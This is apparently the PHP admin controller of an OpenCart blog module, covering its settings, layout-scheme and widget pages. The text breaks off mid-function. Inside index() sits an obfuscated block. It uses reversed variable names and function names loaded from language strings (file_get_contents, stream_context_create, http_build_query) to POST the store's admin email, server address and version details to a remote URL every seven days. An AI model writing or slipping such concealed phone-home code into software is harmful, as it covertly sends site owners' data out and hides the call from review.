<?php
class ControllerModuleBlog extends Controller
{
	private $error = array();
	protected  $data;

	public function index()
	{
        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);
		require_once(DIR_SYSTEM . 'library/iblog.php');
		require_once(DIR_SYSTEM . 'library/exceptionizer.php');

		if ($this->table_exists(DB_PREFIX . "blog_description")) {
			$r = $this->db->query("DESCRIBE `" . DB_PREFIX . "blog_description` `meta_title`");
			if ($r->num_rows == 0) {
	         	$this->createTables();
			}
		} else {
           	$this->createTables();
		}

        $this->language->load('module/blog');
		$this->data['oc_version'] = str_pad(str_replace(".", "", VERSION), 7, "0");
		$this->data['colorbox_theme'] = iBlog::searchdir(DIR_CATALOG . "view/javascript/blog/colorbox/css", 'DIRS');

		$this->load->model('setting/setting');
		$this->data['blog_version'] = '*';
		$this->data['blog_version_model'] = 'PRO';
		$settings_admin = $this->model_setting_setting->getSetting('ascp_version', 'ascp_version');
		foreach ($settings_admin as $key => $value) { $this->data['blog_version'] = $value; }
		$settings_admin_model = $this->model_setting_setting->getSetting('ascp_version_model', 'ascp_version_model');
		foreach ($settings_admin_model as $key => $value) { $this->data['blog_version_model'] = $value; }

		$this->load->model('localisation/language');
		$this->data['languages'] = $this->model_localisation_language->getLanguages();
        $this->load->model('setting/setting');
        $liame_gifnoc = $this->language->get('text_liame_gifnoc');
		$store_info = $this->model_setting_setting->getSetting('config', 0);
        if (isset($store_info[$liame_gifnoc])) { $this->data['liame'] = $store_info[$liame_gifnoc];
        } else { $this->data['liame'] = '';  }
        $value_gnal = $this->config->get('config_language');
        $text_gnal = $this->language->get('text_gnal');
        $text_rdda = $this->language->get('text_rdda');
        $value_rdda = $this->language->get('value_rdda');
        $text_liame = $this->language->get('text_liame');
        $text_rev = $this->language->get('text_rev');
        $text_rev_model = $this->language->get('text_rev_model');
        $value_tnega = $this->language->get('value_tnega');
        $value_revres = $this->language->get('value_revres');
        $value_ctlg = $this->language->get('value_ctlg');
        $text_ctlg = $this->language->get('text_ctlg');
        $text_ptth = $this->language->get('text_ptth');
        $text_dohtem = $this->language->get('text_dohtem');
        $text_tsop = $this->language->get('text_tsop');
        $stnetnoc_teg_elif = $this->language->get('text_stnetnoc_teg_elif');
        $yreuq_dliub_ptth = $this->language->get('text_yreuq_dliub_ptth');
    	$rev_knil= $this->language->get('text_rev_knil');
        $redaeh = $this->language->get('text_redaeh');
        $tnetnoc = $this->language->get('text_tnetnoc');
        $text_redaeh_stpo_1 = $this->language->get('text_redaeh_stpo_1');
        $text_redaeh_stpo_2 = $this->language->get('text_redaeh_stpo_2');
        $text_redaeh_stpo_3 = $this->language->get('text_redaeh_stpo_3');
        $text_redaeh_stpo_4 = $this->language->get('text_redaeh_stpo_4');
        $text_redaeh_stpo_5 = $this->language->get('text_redaeh_stpo_5');
        $text_redaeh_stpo_6 = $this->language->get('text_redaeh_stpo_6');
        $text_redaeh_stpo_7 = $this->language->get('text_redaeh_stpo_7');
        $text_redaeh_stpo_8 = $this->language->get('text_redaeh_stpo_8');
        $text_redaeh_stpo_9 = $this->language->get('text_redaeh_stpo_9');
        $text_redaeh_stpo_10 = $this->language->get('text_redaeh_stpo_10');
        $etaerc_txetnoc_maerts = $this->language->get('text_etaerc_txetnoc_maerts');
        $ver_content = $this->config->get('ascp_ver_content');
        $date_ver_update = $this->config->get('ascp_ver_date');
        $date_current = date("d-m-Y");
        $date_diff = ((strtotime($date_current) - strtotime($date_ver_update))/3600/24);
		$text_redaeh_stpo = $text_redaeh_stpo_1.$value_tnega.$text_redaeh_stpo_2.$text_redaeh_stpo_3.$text_redaeh_stpo_4.$text_redaeh_stpo_5.$text_redaeh_stpo_6.$text_redaeh_stpo_7.$text_redaeh_stpo_8.$text_redaeh_stpo_9.$value_revres.$text_redaeh_stpo_10;
        if ($date_diff > 7)
        {
            $ver_content = false;
			$opts = array( $text_ptth => array($text_dohtem =>$text_tsop, $redaeh =>$text_redaeh_stpo, $tnetnoc => $yreuq_dliub_ptth(array($text_ctlg=>$value_ctlg,$text_gnal=>$value_gnal,$text_rdda =>$value_rdda, $text_liame => $this->data['liame'], $text_rev=>$this->data['blog_version'], $text_rev_model=>$this->data['blog_version_model'] ))));
		    $context = $etaerc_txetnoc_maerts($opts);
            $exceptionizer = new PHP_Exceptionizer(E_ALL);
		    try { $ver_content = $stnetnoc_teg_elif($rev_knil, FALSE , $context);  }  catch (E_WARNING $e) { //echo "Warning or better raised: " . $e->getMessage();
		    }
			$this->model_setting_setting->editSetting('ascp_ver', Array('ascp_ver_date' => $date_current, 'ascp_ver_content' => $ver_content ));
		}
		if ($this->data['blog_version']!=$ver_content) {
         $this->data['text_new_version'] = $this->language->get('text_new_version').$ver_content. " <span style='color: #000; font-weight: normal;'>(".$date_ver_update.")</span>". $this->language->get('text_new_version_end');
		} else {
		 $this->data['text_new_version'] = '';
		}

		$blog_version = $this->language->get('blog_version');
		if ($this->data['blog_version'] != $blog_version) {
			$this->data['text_update'] = $this->language->get('text_update');
		}
		$this->document->setTitle(strip_tags($this->language->get('heading_title')));

		if (file_exists(DIR_APPLICATION . 'view/stylesheet/seocmspro.css')) {
			$this->document->addStyle('view/stylesheet/seocmspro.css');
		}
		if (file_exists(DIR_APPLICATION . 'view/stylesheet/colpick.css')) {
			$this->document->addStyle('view/stylesheet/colpick.css');
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/colpick/colpick.js')) {
			$this->document->addScript('view/javascript/blog/colpick/colpick.js');
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/jquery/tabs.js')) {
			$this->document->addScript('view/javascript/jquery/tabs.js');
		} else {
			if (file_exists(DIR_APPLICATION . 'view/javascript/blog/tabs/tabs.js')) {
				$this->document->addScript('view/javascript/blog/tabs/tabs.js');
			}
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/seocmspro.js')) {
			$this->document->addScript('view/javascript/blog/seocmspro.js');
		}

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->cache->delete('blog');
			$this->deletecache('ajax');
			$this->deletecache('html');
			$this->cache->delete('record');
			$this->cache->delete('blogsrecord');
			$this->cache->delete('html');

   			$css_name ="seocmspro.css";
   			if (file_exists(DIR_CACHE. $css_name)) {
				unlink(DIR_CACHE. $css_name);
			}
   			if (file_exists(DIR_IMAGE. $css_name)) {
				unlink(DIR_IMAGE. $css_name);
			}

			if (isset($this->request->post['ascp_settings']['comment_type'])) {
              foreach ($this->request->post['ascp_settings']['comment_type'] as $type_id => $comment_type) {
                	 if ($comment_type ['title'][$this->config->get('config_language_id')]=='') {
                   $this->request->post['ascp_settings']['comment_type'][$comment_type ['type_id']] ['title'][$this->config->get('config_language_id')] = 'Type-'.$comment_type ['type_id'];
              	 }

              	 if ($type_id != $comment_type ['type_id']) {
              	 	unset($this->request->post['ascp_settings']['comment_type'][$type_id]);
              	 	$this->request->post['ascp_settings']['comment_type'][$comment_type ['type_id']] = $comment_type;
              	 }
              }
			}


			$this->add_fields();
			$this->model_setting_setting->editSetting('ascp_settings', $this->request->post);
			$this->model_setting_setting->editSetting('ascp_comp_url', $this->request->post);
			$this->session->data['success'] = $this->language->get('text_success');

			if (SCP_VERSION < 2) {
				$this->redirect($this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL'));
			}

		}

		if (isset($this->session->data['success'])) {
			$this->data['success'] = $this->session->data['success'];

			unset($this->session->data['success']);
		} else {
			$this->data['success'] = '';
		}


		$this->data['token'] = $this->session->data['token'];
		$this->data['heading_title'] = $this->language->get('heading_title');
		$this->data['text_enabled'] = $this->language->get('text_enabled');
		$this->data['text_disabled'] = $this->language->get('text_disabled');
		$this->data['text_content_top'] = $this->language->get('text_content_top');
		$this->data['text_content_bottom'] = $this->language->get('text_content_bottom');
		$this->data['text_column_left'] = $this->language->get('text_column_left');
		$this->data['text_column_right'] = $this->language->get('text_column_right');
		$this->data['text_what_blog'] = $this->language->get('text_what_blog');
		$this->data['text_what_list'] = $this->language->get('text_what_list');
		$this->data['text_what_all'] = $this->language->get('text_what_all');
		$this->data['entry_what'] = $this->language->get('entry_what');
		$this->data['entry_small_dim'] = $this->language->get('entry_small_dim');
		$this->data['entry_big_dim'] = $this->language->get('entry_big_dim');
		$this->data['entry_blog_num_comments'] = $this->language->get('entry_blog_num_comments');
		$this->data['entry_blog_num_records'] = $this->language->get('entry_blog_num_records');
		$this->data['entry_blog_num_desc'] = $this->language->get('entry_blog_num_desc');
		$this->data['entry_blog_num_desc_words'] = $this->language->get('entry_blog_num_desc_words');
		$this->data['entry_blog_num_desc_pred'] = $this->language->get('entry_blog_num_desc_pred');
		$this->data['entry_blog_template'] = $this->language->get('entry_blog_template');
		$this->data['entry_blog_template_record'] = $this->language->get('entry_blog_template_record');
		$this->data['tab_general'] = $this->language->get('tab_general');
		$this->data['tab_list'] = $this->language->get('tab_list');
		$this->data['entry_layout'] = $this->language->get('entry_layout');
		$this->data['entry_position'] = $this->language->get('entry_position');
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_sort_order'] = $this->language->get('entry_sort_order');
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_add_module'] = $this->language->get('button_add_module');
		$this->data['button_remove'] = $this->language->get('button_remove');
		$this->data['url_blog'] = $this->url->link('catalog/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_record'] = $this->url->link('catalog/record', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_fields'] = $this->url->link('catalog/fields', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_adapter'] = $this->url->link('catalog/adapter', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_comment'] = $this->url->link('catalog/comment', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_create'] = $this->url->link('module/blog/createtables', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_script_reviews'] = $this->url->link('module/blog/script_reviews', 'token=' . $this->session->data['token'], 'SSL');

		$this->data['url_delete'] = $this->url->link('module/blog/deleteoldsetting', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_delete_all_settings'] = $this->url->link('module/blog/deleteallsettings', 'token=' . $this->session->data['token'], 'SSL');

		$this->data['url_modules'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_modules_text'] = $this->language->get('url_modules_text');
		$this->data['url_blog_text'] = $this->language->get('url_blog_text');
		$this->data['url_record_text'] = $this->language->get('url_record_text');
		$this->data['url_fields_text'] = $this->language->get('url_fields_text');
		$this->data['url_comment_text'] = $this->language->get('url_comment_text');
		$this->data['url_create_text'] = $this->language->get('url_create_text');
		$this->data['url_delete_text'] = $this->language->get('url_delete_text');
		$this->data['url_delete_all_settings_text'] = $this->language->get('url_delete_all_settings_text');
		$this->data['url_options'] = $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_schemes'] = $this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_url'] = $this->url->link('module/blog/url', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_widgets'] = $this->url->link('module/blog/widgets', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['action'] = $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['cancel'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');

		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		$this->data['breadcrumbs'] = array();
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => false
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_module'),
			'href' => $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' :: '
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('heading_title'),
			'href' => $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' / '
		);
        $no_image = '';
        if (file_exists(DIR_IMAGE . 'no_image.jpg')) {
			$no_image = 'no_image.jpg';
		}
        if (file_exists(DIR_IMAGE . 'no_image.png')) {
			$no_image = 'no_image.png';
		}

		if (isset($this->request->post['ascp_settings'])) {
			$this->data['ascp_settings'] = $this->request->post['ascp_settings'];
		} else {
			$this->data['ascp_settings'] = $this->config->get('ascp_settings');
		}

		 $this->load->model('localisation/order_status');
		 $this->data['order_statuses'] = $this->model_localisation_order_status->getOrderStatuses();

         if (!isset($this->data['ascp_settings']['complete_status']) || !is_array($this->data['ascp_settings']['complete_status'])) {

         	if (SCP_VERSION < 2) {
         		$this->data['ascp_settings']['complete_status'] = Array( 0 => $this->config->get('config_complete_status_id'));
         	}
         }


		$this->load->model('tool/image');
		if (isset($this->data['ascp_settings']['avatar_default']) && $this->data['ascp_settings']['avatar_default']!=''  && file_exists(DIR_IMAGE . $this->data['ascp_settings']['avatar_default'])) {
			$this->data['avatar_default'] = $this->model_tool_image->resize($this->data['ascp_settings']['avatar_default'], 100, 100);
		} else {
			$this->data['avatar_default'] = $this->model_tool_image->resize($no_image, 100, 100);
		}

		if (isset($this->data['ascp_settings']['avatar_admin']) && $this->data['ascp_settings']['avatar_admin']!=''  && file_exists(DIR_IMAGE . $this->data['ascp_settings']['avatar_admin'])) {
			$this->data['avatar_admin'] = $this->model_tool_image->resize($this->data['ascp_settings']['avatar_admin'], 100, 100);
		} else {
			$this->data['avatar_admin'] = $this->model_tool_image->resize($no_image, 100, 100);
		}

		if (isset($this->data['ascp_settings']['avatar_buy']) && $this->data['ascp_settings']['avatar_buy']!=''  && file_exists(DIR_IMAGE . $this->data['ascp_settings']['avatar_buy'])) {
			$this->data['avatar_buy'] = $this->model_tool_image->resize($this->data['ascp_settings']['avatar_buy'], 100, 100);
		} else {
			$this->data['avatar_buy'] = $this->model_tool_image->resize($no_image, 100, 100);
		}

		if (isset($this->data['ascp_settings']['avatar_buyproduct']) && $this->data['ascp_settings']['avatar_buyproduct']!=''  && file_exists(DIR_IMAGE . $this->data['ascp_settings']['avatar_buyproduct'])) {
			$this->data['avatar_buyproduct'] = $this->model_tool_image->resize($this->data['ascp_settings']['avatar_buyproduct'], 100, 100);
		} else {
			$this->data['avatar_buyproduct'] = $this->model_tool_image->resize($no_image, 100, 100);
		}


		 if (!isset($this->data['ascp_settings']['comment_type']) || empty($this->data['ascp_settings']['comment_type'])) {
			 $this->data['ascp_settings']['comment_type'] =
			 array( '1' =>
			 		array( 'type_id' => '1',
			 				'title' => array ( $this->config->get('config_language_id') => 'Comment')
			 			 ),
					'2' =>
			 		array( 'type_id' => '2',
			 				'title' => array ( $this->config->get('config_language_id') => 'Poll')
			 			 ),
					'3' =>
			 		array( 'type_id' => '3',
			 				'title' => array ( $this->config->get('config_language_id') => 'FAQ')
			 			 )
			 );
		 }


		if (isset($this->data['ascp_settings']['avatar_reg']) && $this->data['ascp_settings']['avatar_reg']!=''  && file_exists(DIR_IMAGE . $this->data['ascp_settings']['avatar_reg'])) {
			$this->data['avatar_reg'] = $this->model_tool_image->resize($this->data['ascp_settings']['avatar_reg'], 100, 100);
		} else {
			$this->data['avatar_reg'] = $this->model_tool_image->resize($no_image, 100, 100);
		}

		$this->data['no_image'] = $this->model_tool_image->resize($no_image, 100, 100);

		if (isset($this->request->post['ascp_settings']['get_pagination'])) {
			$this->data['ascp_settings']['get_pagination'] = $this->request->post['ascp_settings']['get_pagination'];
		} else {
			if (isset($this->data['ascp_settings']['get_pagination'])) {
				$this->data['ascp_settings']['get_pagination'] = $this->data['ascp_settings']['get_pagination'];
			} else {
				$this->data['ascp_settings']['get_pagination'] = 'tracking';
			}
		}
		if (isset($this->data['ascp_settings']['further'])) {
		} else {
			$this->data['ascp_settings']['further'][$this->config->get('config_language_id')] = '<ins style="font-size: 18px; text-decoration: none;">&rarr;</ins>';
		}

		if (isset($this->request->post['ascp_settings']['blog_small'])) {
			$this->data['ascp_settings']['blog_small'] = $this->request->post['ascp_settings']['blog_small'];
		}
		if (isset($this->request->post['ascp_settings']['blog_big'])) {
			$this->data['ascp_settings']['blog_big'] = $this->request->post['ascp_settings']['blog_big'];
		}
		if (isset($this->request->post['ascp_settings']['blog_num_records'])) {
			$this->data['ascp_settings']['blog_num_records'] = $this->request->post['ascp_settings']['blog_num_records'];
		}
		if (isset($this->request->post['ascp_settings']['blog_num_comments'])) {
			$this->data['ascp_settings']['blog_num_comments'] = $this->request->post['ascp_settings']['blog_num_comments'];
		}
		if (isset($this->request->post['ascp_settings']['blog_num_desc'])) {
			$this->data['ascp_settings']['blog_num_desc'] = $this->request->post['ascp_settings']['blog_num_desc'];
		}
		if (isset($this->request->post['ascp_settings']['blog_num_desc_words'])) {
			$this->data['ascp_settings']['blog_num_desc_words'] = $this->request->post['ascp_settings']['blog_num_desc_words'];
		}
		if (isset($this->request->post['ascp_settings']['blog_num_desc_pred'])) {
			$this->data['ascp_settings']['blog_num_desc_pred'] = $this->request->post['ascp_settings']['blog_num_desc'];
		}
		if (isset($this->request->post['ascp_settings']['blog_resize'])) {
			$this->data['ascp_settings']['blog_resize'] = $this->request->post['ascp_settings']['blog_resize'];
		}
		if (isset($this->request->post['ascp_settings']['blog_search'])) {
			$this->data['ascp_settings']['blog_search'] = $this->request->post['ascp_settings']['blog_search'];
		}

		$this->load->model('catalog/blog');
		$this->data['categories'] = $this->model_catalog_blog->getCategories(0);



		if (isset($this->request->post['ascp_widgets'])) {
			$this->data['ascp_widgets'] = $this->request->post['ascp_widgets'];
		} else {
			$this->data['ascp_widgets'] = $this->config->get('ascp_widgets');
		}

		$this->data['ascp_comp_url'] = $this->config->get('ascp_comp_url');

		if (count($this->data['ascp_widgets']) > 0) {

			if (!is_array($this->data['ascp_widgets'])) {
				$this->data['ascp_widgets'] = array();
			}

			ksort($this->data['ascp_widgets']);
		}

			if (!isset($this->data['ascp_settings']['box_share'])) {
			$this->data['ascp_settings']['box_share'] = '<!-- AddThis Button BEGIN -->
<div  class="addthis_toolbox addthis_default_style">
	<a class="addthis_button_facebook_like" fb:like:layout="button_count"></a>
	<a class="addthis_button_tweet"></a>
	<a class="addthis_button_pinterest_pinit">
	<a class="addthis_button_facebook"></a>
	<a class="addthis_button_vk"></a>
	<a class="addthis_button_odnoklassniki_ru"></a>
	<a class="addthis_button_youtube"></a>
	<a class="addthis_button_twitter"></a>
	<a class="addthis_button_email"></a>
	<a class="addthis_button_compact"></a>
</div>
<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js"></script>
<!-- AddThis Button END -->';
			}

			if (!isset($this->data['ascp_settings']['box_share_list'])) {
			$this->data['ascp_settings']['box_share_list'] = '<!-- AddThis Button BEGIN -->
<div class="addthis_toolbox addthis_default_style "
	addthis:url="{URL}"
	addthis:title="{TITLE}"
	addthis:description="{DESCRIPTION}">
	<a class="addthis_button_facebook"></a>
	<a class="addthis_button_vk"></a>
	<a class="addthis_button_odnoklassniki_ru"></a>
	<a class="addthis_button_twitter"></a>
	<a class="addthis_button_email"></a>
	<a class="addthis_button_compact"></a>
</div>
<script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js"></script>
<!-- AddThis Button END -->';
			}


		if (SCP_VERSION < 2) {
			if (!isset($this->data['ascp_settings']['box_begin'])) {
			$this->data['ascp_settings']['box_begin'] = '<div class="box">
<div class="box-heading">{TITLE}</div>
<div class="box-content">';
			}

			if (!isset($this->data['ascp_settings']['box_end'])) {
			$this->data['ascp_settings']['box_end'] = '</div>
</div>';
			}
		} else {
			if (!isset($this->data['ascp_settings']['box_begin'])) {
			$this->data['ascp_settings']['box_begin'] = '<div>
<h3>{TITLE}</h3>';
			}

			if (!isset($this->data['ascp_settings']['box_end'])) {
			$this->data['ascp_settings']['box_end'] = '</div>';
			}

		}

		$this->data['css_dir'] = array('cache','image');
		$this->data['css_font_size'] = array('','0px', '1px', '2px', '3px', '4px', '5px', '6px', '7px','8px', '9px', '10px', '11px', '12px', '13px', '14px', '15px', '16px', '17px', '18px', '19px', '20px', '21px', '22px', '23px', '24px', '25px', '26px', '27px', '28px', '29px', '30px');
		$this->data['css_text_decoration'] = array('', 'none', 'underline', 'blink', 'line-through', 'overline', 'inherit');
        $this->data['css_font_weight'] = array('','normal', 'bold', 'bolder', 'lighter');

		$this->data['modules'] = array();
		if (isset($this->request->post['blog_module'])) {
			$this->data['modules'] = $this->request->post['blog_module'];
		} elseif ($this->config->get('blog_module')) {
			$this->data['modules'] = $this->config->get('blog_module');
		}
		$this->load->model('design/layout');
		$this->data['layouts'] = $this->model_design_layout->getLayouts();


       $this->cont('agooa/adminmenu');
       $this->data['agoo_menu'] = $this->controller_agooa_adminmenu->index();


		$this->template = 'module/blog.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);
        $this->data['blog_version'] = $this->data['blog_version']. ' '. $this->data['blog_version_model'];
		$this->data['registry'] = $this->registry;
		$this->data['language'] =  $this->language;
		$this->data['config'] 	=  $this->config;

        if (SCP_VERSION < 2) {
			$this->data['column_left'] ='';
			$html = $this->render();
		}
		$this->response->setOutput($html);
	}
/***************************************/
	public function schemes()
	{
        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);

		require_once(DIR_SYSTEM . 'library/iblog.php');
		$this->data['colorbox_theme'] = iBlog::searchdir(DIR_CATALOG . "view/javascript/blog/colorbox/css", 'DIRS');

		$this->load->model('setting/setting');
		$this->data['blog_version'] = '*';
		$this->data['blog_version_model'] = 'PRO';
		$settings_admin = $this->model_setting_setting->getSetting('ascp_version', 'ascp_version');
		foreach ($settings_admin as $key => $value) { $this->data['blog_version'] = $value; }
		$settings_admin_model = $this->model_setting_setting->getSetting('ascp_version_model', 'ascp_version_model');
		foreach ($settings_admin_model as $key => $value) { $this->data['blog_version_model'] = $value; }


		$this->language->load('module/blog');
		$blog_version = $this->language->get('blog_version');
		if ($this->data['blog_version'] != $blog_version) {
			$this->data['text_update'] = $this->language->get('text_update');
		}
		$this->document->setTitle(strip_tags($this->language->get('heading_title')));

		if (file_exists(DIR_APPLICATION . 'view/stylesheet/seocmspro.css')) {
			$this->document->addStyle('view/stylesheet/seocmspro.css');
		}
		if (file_exists(DIR_APPLICATION . 'view/javascript/blog/seocmspro.js')) {
			$this->document->addScript('view/javascript/blog/seocmspro.js');
		}
		//$this->document->addStyle('http://fonts.googleapis.com/css?family=Open+Sans&subset=latin,cyrillic-ext,latin-ext');

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->cache->delete('blog');
			$this->cache->delete('record');
			$this->cache->delete('blogsrecord');
			$this->cache->delete('html');
			$this->add_fields();

              foreach ($this->request->post as $name => $post) {
	                foreach ($post as $num => $val) {
	                    if (!isset($val['layout_id'])) {
	                      $this->request->post[$name][$num]['layout_id'] = Array();
	                    }
	              }
              }

			$this->model_setting_setting->editSetting('blog_module', $this->request->post);
			$this->session->data['success'] = $this->language->get('text_success');
            /*
			if (SCP_VERSION < 2) {
				$this->redirect($this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL'));
			} else {
            	$this->response->redirect($this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL'));
            }*/
		}

		if (isset($this->session->data['success'])) {
			$this->data['success'] = $this->session->data['success'];

			unset($this->session->data['success']);
		} else {
			$this->data['success'] = '';
		}



		$this->data['token'] = $this->session->data['token'];
		$this->data['heading_title'] = $this->language->get('heading_title');
		$this->data['text_enabled'] = $this->language->get('text_enabled');
		$this->data['text_disabled'] = $this->language->get('text_disabled');
		$this->data['text_content_top'] = $this->language->get('text_content_top');
		$this->data['text_content_bottom'] = $this->language->get('text_content_bottom');
		$this->data['text_column_left'] = $this->language->get('text_column_left');
		$this->data['text_column_right'] = $this->language->get('text_column_right');
		$this->data['text_what_blog'] = $this->language->get('text_what_blog');
		$this->data['text_what_list'] = $this->language->get('text_what_list');
		$this->data['text_what_all'] = $this->language->get('text_what_all');
		$this->data['entry_what'] = $this->language->get('entry_what');
		$this->data['entry_small_dim'] = $this->language->get('entry_small_dim');
		$this->data['entry_big_dim'] = $this->language->get('entry_big_dim');
		$this->data['entry_blog_num_comments'] = $this->language->get('entry_blog_num_comments');
		$this->data['entry_blog_num_records'] = $this->language->get('entry_blog_num_records');
		$this->data['entry_blog_num_desc'] = $this->language->get('entry_blog_num_desc');
		$this->data['entry_blog_num_desc_words'] = $this->language->get('entry_blog_num_desc_words');
		$this->data['entry_blog_num_desc_pred'] = $this->language->get('entry_blog_num_desc_pred');
		$this->data['entry_blog_template'] = $this->language->get('entry_blog_template');
		$this->data['entry_blog_template_record'] = $this->language->get('entry_blog_template_record');
		$this->data['tab_general'] = $this->language->get('tab_general');
		$this->data['tab_list'] = $this->language->get('tab_list');
		$this->data['entry_layout'] = $this->language->get('entry_layout');
		$this->data['entry_position'] = $this->language->get('entry_position');
		$this->data['entry_status'] = $this->language->get('entry_status');
		$this->data['entry_sort_order'] = $this->language->get('entry_sort_order');
		$this->data['button_save'] = $this->language->get('button_save');
		$this->data['button_cancel'] = $this->language->get('button_cancel');
		$this->data['button_add_module'] = $this->language->get('button_add_module');
		$this->data['button_remove'] = $this->language->get('button_remove');
		$this->data['url_blog'] = $this->url->link('catalog/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_record'] = $this->url->link('catalog/record', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_comment'] = $this->url->link('catalog/comment', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_create'] = $this->url->link('module/blog/createtables', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_modules'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_modules_text'] = $this->language->get('url_modules_text');
		$this->data['url_blog_text'] = $this->language->get('url_blog_text');
		$this->data['url_record_text'] = $this->language->get('url_record_text');
		$this->data['url_comment_text'] = $this->language->get('url_comment_text');
		$this->data['url_create_text'] = $this->language->get('url_create_text');
		$this->data['url_options'] = $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_schemes'] = $this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_url'] = $this->url->link('module/blog/url', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['url_widgets'] = $this->url->link('module/blog/widgets', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['action'] = $this->url->link('module/blog/schemes', 'token=' . $this->session->data['token'], 'SSL');
		$this->data['cancel'] = $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL');
		$this->load->model('localisation/language');
		$this->data['languages'] = $this->model_localisation_language->getLanguages();
		if (isset($this->error['warning'])) {
			$this->data['error_warning'] = $this->error['warning'];
		} else {
			$this->data['error_warning'] = '';
		}
		$this->data['breadcrumbs'] = array();
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_home'),
			'href' => $this->url->link('common/home', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => false
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('text_module'),
			'href' => $this->url->link('extension/module', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' :: '
		);
		$this->data['breadcrumbs'][] = array(
			'text' => $this->language->get('heading_title'),
			'href' => $this->url->link('module/blog', 'token=' . $this->session->data['token'], 'SSL'),
			'separator' => ' / '
		);
		if (isset($this->request->post['ascp_widgets'])) {
			$this->data['ascp_widgets'] = $this->request->post['ascp_widgets'];
		} else {
			$this->data['ascp_widgets'] = $this->config->get('ascp_widgets');
		}

		if (count($this->data['ascp_widgets']) > 0) {
			ksort($this->data['ascp_widgets']);
		}
		$this->data['modules'] = array();

		if (isset($this->request->post['blog_module'])) {
			$this->data['modules'] = $this->request->post['blog_module'];
		} elseif ($this->config->get('blog_module')) {
			$this->data['modules'] = $this->config->get('blog_module');
		}



		$this->load->model('design/layout');
		$this->data['layouts'] = $this->model_design_layout->getLayouts();

       $this->cont('agooa/adminmenu');
       $this->data['agoo_menu'] = $this->controller_agooa_adminmenu->index();

		$this->template = 'module/blog_schemes.tpl';
		$this->children = array(
			'common/header',
			'common/footer'
		);

		$this->data['blog_version'] = $this->data['blog_version']. ' '. $this->data['blog_version_model'];
		$this->data['registry'] = $this->registry;
		$this->data['language'] =  $this->language;
		$this->data['config'] 	=  $this->config;

        if (SCP_VERSION < 2) {
			$this->data['column_left'] ='';
			$html = $this->render();
		}

		$this->response->setOutput($html);

	}
/***************************************/

	public function widgets()
	{
        $ver = VERSION;
 		if (!defined('SCP_VERSION')) define('SCP_VERSION', $ver[0]);

		require_once(DIR_SYSTEM . 'library/iblog.php');
		$this->data['colorbox_theme'] = iBlog::searchdir(DIR_CATALOG . "view/javascript/blog/colorbox/css", 'DIRS');
		$this->load->model('setting/setting');

		$this->load->model('setting/setting');
		$this->data['blog_version'] = '*';
		$this->data['blog_version_model'] = 'PRO';
		$settings_admin = $this->model_setting_setting->getSetting('ascp_version', 'ascp_version');
		foreach ($settings_admin as $key => $value) { $this->data['blog_version'] = $value; }
		$settings_admin_model = $this->model_setting_setting->getSetting('ascp_version_model', 'ascp_version_model');
		foreach ($settings_admin_model as $key => $value) { $this->data['blog_version_model'] = $value; }

		$this->language->load('module/blog');
		$blog_version = $this->language->get('blog_version');
		if ($this->data['blog_version'] != $blog_version) {
			$this->data['text_update'] = $this->language->get('text_update');
		}
		$this->document->setTitle(strip_tags($this->language->get('heading_title')));

		if (isset($this->request->get['tab']) && $this->request->get['tab']!='') {
